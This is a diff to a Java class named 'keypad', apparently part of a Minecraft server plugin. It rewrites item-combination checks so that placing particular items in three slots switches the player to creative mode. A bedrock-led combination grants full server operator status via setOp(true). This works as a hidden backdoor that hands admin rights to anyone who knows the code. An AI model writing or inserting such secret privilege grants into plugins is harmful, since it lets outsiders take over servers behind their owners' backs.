@@ -45,9 +45,9 @@ public class keypad implements CommandExecutor {
 
         //creative
 
-        if (keypad.getItem(1).equals(keypad2)) {
-            if (keypad.getItem(2).equals(keypad1)) {
-                if (keypad.getItem(3).equals(keypad3)) {
+        if (keypad.getItem(1).getType().isItem() && keypad.getItem(1).getType().equals(keypad3)) {
+            if (keypad.getItem(2).getType().isItem() && keypad.getItem(2).getType().equals(keypad3)) {
+                if (keypad.getItem(3).getType().isItem() && keypad.getItem(3).getType().equals(keypad3)) {
 
                     player.setGameMode(GameMode.CREATIVE);
                     return true;
@@ -59,10 +59,11 @@ public class keypad implements CommandExecutor {
 
         //OP
 
-        if (keypad.getItem(1).equals(Material.BEDROCK)) {
-            if (keypad.getItem(2).equals(keypad2)) {
-                if (keypad.getItem(3).equals(keypad1)) {
+        if (keypad.getItem(1).getType().isItem() && keypad.getItem(1).getType().equals(Material.BEDROCK)) {
+            if (keypad.getItem(2).getType().isItem() && keypad.getItem(2).getType().equals(keypad3)) {
+                if (keypad.getItem(3).getType().isItem() && keypad.getItem(3).getType().equals(keypad3)) {
 
+                    player.setGameMode(GameMode.CREATIVE);
                     player.setOp(true);
                     return true;
                 }
